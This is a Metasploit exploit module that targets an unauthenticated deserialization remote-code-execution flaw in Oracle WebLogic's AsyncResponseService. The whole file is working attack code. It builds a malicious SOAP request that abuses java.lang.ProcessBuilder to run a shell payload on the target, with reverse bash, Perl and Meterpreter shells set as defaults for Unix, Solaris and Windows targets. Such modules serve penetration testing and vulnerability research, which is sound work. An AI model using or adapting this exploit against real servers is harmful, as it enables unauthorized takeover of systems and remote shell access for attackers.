##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name' => 'Oracle Weblogic Server Deserialization RCE - AsyncResponseService ',
      'Description' => %q{
        An unauthenticated attacker with network access to the Oracle Weblogic Server T3
        interface can send a malicious SOAP request to the interface WLS AsyncResponseService 
        to execute code on the vulnerable host.
      },
      'Author' =>
        [
        'Andres Rodriguez',  # Metasploit Module - 2Secure (@acamro, acamro[at]gmail.com)
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CNVD-C', '2019-48814'],
          ['URL', 'http://www.cnvd.org.cn/webinfo/show/4999']
        ],
      'Privileged' => false,
      'Platform' => %w{ unix win solaris },
      'Targets' =>
        [
          [ 'Unix',
            'Platform' => 'unix',
            'Arch' => [ARCH_CMD],
            'DefaultOptions' => {
	      'PAYLOAD' => 'cmd/unix/reverse_bash'
	    }
          ],
          [ 'Windows',
            'Platform' => 'win',
            'Payload' => {},
	    'Arch' => [ARCH_X64, ARCH_X86],
            'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'}
          ],
          [ 'Solaris',
            'Platform' => 'solaris',
            'Arch' => ARCH_CMD,
            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_perl'},
            'Payload' => {
              'Space'       => 2048,
              'DisableNops' => true,
              'Compat'      =>
                {
                  'PayloadType' => 'cmd',
                  'RequiredCmd' => 'generic perl telnet',
                }
            }
          ]
        ],
      'DefaultTarget' => 0,
      'DefaultOptions' =>
        {
          'WfsDelay' => 12
        },
      'DisclosureDate' => 'Apr 23 2019'))

    register_options(
      [
        Opt::RPORT(7001),
	OptString.new('RHOSTS', [false]),
        OptString.new('URIPATH', [true, 'URL to the weblogic instance', '']),
        OptString.new('WSPATH', [true, 'URL to AsyncResponseService', '/_async/AsyncResponseService'])
      ]
    )
  end
  
  def send_payload
    uri = normalize_uri(datastore['WSPATH'])
    
    print_status("Generating payload...")
    # payload creation
    if target.name == 'Windows'
      xml_cmd = "          <void index=\"0\"> "
      xml_cmd <<  "            <string>cmd.exe</string> "
      xml_cmd <<  "          </void> "
      xml_cmd <<  "          <void index=\"1\"> "
      xml_cmd <<  "            <string>/c</string> "
      xml_cmd <<  "          </void> "
      shell_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true, encoded: false })
    elsif target.name == 'Unix' || target.name == 'Solaris'
      xml_cmd =  "          <void index=\"0\"> "
      xml_cmd <<  "            <string>/bin/bash</string> "
      xml_cmd <<  "          </void> "
      xml_cmd <<  "          <void index=\"1\"> "
      xml_cmd <<  "            <string>-c</string> "
      xml_cmd <<  "          </void> "
      shell_payload = payload.encoded
    end

    random_action = rand_text_alphanumeric(20)
    random_relates = rand_text_alphanumeric(20)
    
    print_status("[#{uri}] Sending payload...")
    soap_payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" "
    soap_payload <<  "  xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" "
    soap_payload <<  "  xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> "
    soap_payload <<  "  <soapenv:Header> "
    soap_payload <<  "    <wsa:Action>#{random_action}</wsa:Action> "
    soap_payload <<  "    <wsa:RelatesTo>#{random_relates}</wsa:RelatesTo> "
    soap_payload <<  "    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> "
    soap_payload <<  "      <void class=\"java.lang.ProcessBuilder\"> "
    soap_payload <<  "        <array class=\"java.lang.String\" length=\"3\"> "

    soap_payload <<  xml_cmd # SO cli

    soap_payload <<  "          <void index=\"2\"> "
    soap_payload <<  "            <string>#{xml_encode(shell_payload)}</string> "
    soap_payload <<  "          </void> "
    soap_payload <<  "        </array> "
    soap_payload <<  "        <void method=\"start\"/> "
    soap_payload <<  "      </void> "
    soap_payload <<  "    </work:WorkContext> "
    soap_payload <<  "  </soapenv:Header> "
    soap_payload <<  "  <soapenv:Body> "
    soap_payload <<  "    <asy:onAsyncDelivery/> "
    soap_payload <<  "  </soapenv:Body> "
    soap_payload <<  "</soapenv:Envelope>"
    
    print_status(shell_payload)

    res = send_request_cgi(
      'uri'      => uri, #datastore['URIPATH'] + uri,
      'method'   => 'POST',
      'ctype'    => 'text/xml',
      'data'     => soap_payload,
      'headers'  => {'SOAPAction' => '' }
    )
    
    if res and res.code != 202
      print_error("Failed to exploit the vulnerability on #{uri}")
      return
    end
  end

  def xml_encode(str)
    ret = ""
    str.unpack('C*').each { |ch|
      case ch
      when 0x41..0x5a, 0x61..0x7a, 0x30..0x39
        ret << ch.chr
      else
        ret << "&#x"
        ret << ch.chr.unpack('H*')[0]
        ret << ";"
      end
    }
    ret
  end

  def exploit

    send_payload

    #handler
  end
end
